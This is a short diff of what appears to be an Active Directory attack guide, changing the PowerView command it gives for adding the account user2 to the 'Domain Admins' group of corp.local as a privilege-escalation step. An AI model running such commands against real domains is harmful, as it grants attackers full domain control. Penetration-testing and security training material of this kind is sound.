@@ -451,7 +451,7 @@ Finally we just need to abuse it.
 
 * PowerView:
 ```powershell
-Add-DomainGroupMember -Identity 'Domain Admins' -Members user2 -Verbose
+Add-NetGroupUser -UserName user2 -GroupName "Domain Admins" -Domain corp.local
 ```
 
 * ADModule:
